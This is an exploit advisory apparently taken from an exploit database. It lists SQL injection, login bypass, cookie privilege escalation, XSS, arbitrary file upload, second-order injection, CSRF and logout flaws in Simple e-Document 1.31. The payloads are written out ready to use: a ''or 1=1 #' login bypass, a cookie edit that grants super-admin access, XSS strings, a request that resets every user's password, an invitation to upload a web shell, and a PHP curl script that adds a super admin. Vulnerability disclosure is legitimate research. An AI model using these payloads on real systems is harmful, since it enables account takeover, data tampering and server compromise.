@@ -1,0 +1,153 @@
+id: 21818
+date: 01/28/2014
+title: Simple e-Document 1.31 SQL Injection / XSS / CSRF Vulnerabilities
+author: PuN!Sh3r
+cves: 
+
+#################################################################################
+[+]Exploit: Simple e-document v1.31 => Sql inj,Login Bypass,XSS,Insecure
+        #
+Cookie Handling(privilege escalation),Arbitrary File Upload,
+    #
+Second order injections, CSRF    ,Insecure logout process
+        #
+[+] Author: PuN!Sh3r
+         #
+[+] Contact: http://anti-armenia.org
+         #
+[+] version: Simple e-document v1.31
+         #
+[+] Vendor Homepage: http://sourceforge.net/projects/simplee-doc/files/
+        #
+#################################################################################
+
+Hi everyone.I want to talk about some vulnerabilities which i have found in
+Simple e-document script's sources.It has a lot issues.
+
+Let's go...
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+1.Sql Injection(multiple=>there is exist another bugs.you can find them
+same tecniques).
+
+admin.php
+---------
+Snip:
+
+$sql = "Insert into edocphp_users values('', '$username', '$r_password',
+'$NOW_TIME', '$is_admin', '$is_s_admin')";
+
+And $username, $r_password had not been sanitized.
+
+-------
+main_out.php( Vulnerable from  head to bottom of page :D )
+main_in.php    (It is also :D )
+-------
+
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+2. Bypass login:
+
+index.php
+---------
+
+write username : 'or 1=1 #
+      password :  blank
+
+      And you will login successfull..
+
+     Vulnerable snip:
+    ...
+     $username= stripslashes($_POST['username']);
+     $password= stripslashes($_POST['password']);
+    ..
+    $sql = "SELECT * From edocphp_users WHERE username='$username' AND
+password ='$r_password'";
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+3.Insecure cookie handling(Privilege escalation):
+
+There is an issue with creating cookies after you login to system.
+if you are simple user your cookie will be that username=Your username;
+access=1;
+You can change cookie part: change access 1 to 3 for capturing super
+administrative access.
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+4.XSS
+
+index.php
+---------
+$_COOKIE['username'] is not sanitized and you can change it to ,for
+example,<script>alert(document.cookie)</script>
+and boom :D XSS appears..
+This vuln is also exist in header_out.php and  admin.php :
+
+admin.php
+----------
+Go to the View/Edit/Remove Users and after clicking update intrecept
+request and type that:
+
+new_password=11111&is_admin=3&username_s=<script>alert()</script>&id=3&op=Update_User
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+5.Arbitrary File Upload
+There is not any restriction in upload.php and you can upload your own
+shell and enjoy :)
+
+http://site.tld/script_path/upload.php?op=newin
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+6.Second order injections
+You can change  all users' passwords in the database with this vuln(Also
+delete):
+-----
+admin.php
+-----
+
+Go to the  View/Edit/Remove Users.
+Change any of these pass to your own
+After clicking update intrecept request with BurpSuite (or OwaspZap etc.)
+and change this
+new_password=&is_admin=3&username_s=admin&id='or 1=1#&op=Update_User
+After this process all users' pass will be changed..
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+7.CSRF
+
+This script doesn't have any session,for this reason you can add new super
+admin.I have written a simple payload for it:
+Payload:
+
+<?php
+$url="http://localhost/simple_e_document/admin.php";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt ($ch, CURLOPT_POST, 1);
+curl_setopt ($ch, CURLOPT_POSTFIELDS,
+"username=admin&password=123456&is_admin=2&op=save_new_user");
+curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIE, "username=FuckTheSystem;access=3");
+$a = curl_exec ($ch);
+echo $a;
+curl_close ($ch);
+?>
+
+Change current values with your own.
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+8.Insecure logout process.
+You can force this proces to change its behaviour.For example,if you press
+logout process,this post action happens :
+
+op=logout&username= ANY USERNAME &Submit=Logout
+you can change username value and make script to logout site for this user.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+#  0day.today [2023-03-27]  #
